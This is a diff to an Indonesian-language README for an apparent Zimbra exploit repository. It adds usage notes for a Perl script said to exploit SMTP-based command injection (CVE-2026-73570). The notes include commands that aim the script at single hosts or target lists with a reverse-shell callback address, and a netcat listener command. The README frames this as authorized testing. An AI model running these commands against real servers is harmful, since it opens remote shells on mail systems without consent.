@@ -155,12 +155,47 @@ Perintah tersebut hanya menampilkan bantuan. Jangan menjalankan skrip eksploitas
 - Pantau log HTTP, SMTP, dan proses pada host Zimbra untuk aktivitas tidak biasa.
 - Uji ulang setelah patch diterapkan menggunakan prosedur keamanan organisasi.
 
-Referensi resmi:
+## Pembaruan Folder CVE-2026-73570
 
-- [NVD: CVE-2022-27925](https://nvd.nist.gov/vuln/detail/CVE-2022-27925)
-- [NVD: CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)
-- [Zimbra Security Center](https://www.zimbra.com/security/)
+Folder `CVE-2026-73570` berisi skrip Perl untuk validasi keamanan terotorisasi terhadap kerentanan injeksi perintah pada notifikasi SNMP Zimbra melalui layanan SMTP. Skrip mendukung pengujian satu target atau daftar target, koneksi SMTP dengan STARTTLS atau TLS langsung, listener reverse shell, output verbose, dan penyimpanan log sesi.
+
+Struktur folder:
+
+```text
+CVE-2026-73570/
+└── CVE-2026-73570.pl
+```
+
+Skrip memerlukan Perl beserta modul `IO::Socket::INET`, `IO::Socket::SSL`, `MIME::Base64`, `Digest::HMAC_MD5`, dan modul standar lain yang digunakan oleh skrip.
+
+Contoh penggunaan terhadap satu target:
+
+```bash
+cd CVE-2026-73570
+perl CVE-2026-73570.pl -H mail.target.com -r 10.10.10.1 -R 4444
+```
+
+Contoh penggunaan dengan daftar target:
+
+```bash
+perl CVE-2026-73570.pl -f targets.txt -r 10.10.10.1 -R 4444
+```
+
+Daftar target mendukung hostname atau alamat IP dengan port opsional, satu target per baris. Port default adalah `587`; gunakan `-p` untuk menggantinya. Listener penerima harus dijalankan pada mesin penguji, misalnya:
+
+```bash
+nc -lvnp 4444
+```
+
+Gunakan opsi `-S` untuk TLS langsung, `-v` untuk detail komunikasi SMTP, `-L FILE` untuk menyimpan log, dan `-h` untuk melihat seluruh opsi. Terapkan patch resmi Zimbra sebelum melakukan validasi dan pastikan setiap target serta alamat listener berada dalam scope pengujian.
 
 ## Lisensi
 
 Repositori ini belum menyertakan berkas lisensi. Penggunaan dan redistribusi kode mengikuti ketentuan dari pemilik repositori serta hukum yang berlaku.
+
+## Referensi resmi:
+
+- [NVD: CVE-2022-27925](https://nvd.nist.gov/vuln/detail/CVE-2022-27925)
+- [NVD: CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)
+- [Zimbra Security Center](https://www.zimbra.com/security/)
+- [CVE-2026-73570](https://github.com/gabrielunknown/cve-2026-73570)
